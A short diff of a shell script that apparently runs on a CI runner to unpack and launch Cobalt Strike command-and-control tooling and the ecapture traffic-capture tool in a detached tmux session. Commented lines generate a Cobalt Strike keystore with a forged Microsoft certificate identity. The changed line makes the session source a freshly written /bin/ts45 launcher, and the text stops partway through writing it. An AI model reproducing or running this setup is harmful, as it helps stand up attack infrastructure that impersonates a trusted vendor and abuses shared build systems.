@@ -1,8 +1,10 @@
-
 sudo mkdir -pv /tmp/cs45/;
 sudo unzip   /home/runner/work/nc_test/nc_test/tool/Z.zip  -d /tmp/cs45/;
 
+
 cd /tmp;
+
+
 
 
 (
@@ -11,14 +13,16 @@ gunzip  /home/runner/work/nc_test/nc_test/tool/ecapture.gz;
 
 
 sudo bash -c "
+
 #cd /tmp/cs45/;
 #rm ./cobaltstrike.store;
 #keytool -keystore ./cobaltstrike.store -storepass 12345678 -keypass 12345678 -genkey -keyalg RSA -alias microsoft -validity 360 -dname 'CN=*.microsoft.com, OU=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=WA, C=US' ;
+
 cd /tmp;
 
 alias tmux='/tmp/tmux.elf -u'
 tmux new -s cs45 -d  ;
-tmux send -t cs45 'cd /tmp;echo /bin/ts45;cat /bin/ts45' ENTER ;
+tmux send -t cs45 'cd /tmp;ls -al /bin/ts45;cat /bin/ts45;. /bin/ts45;' ENTER ;
 
 cat<<EOF>/bin/ts45
 cd /tmp/cs45/;
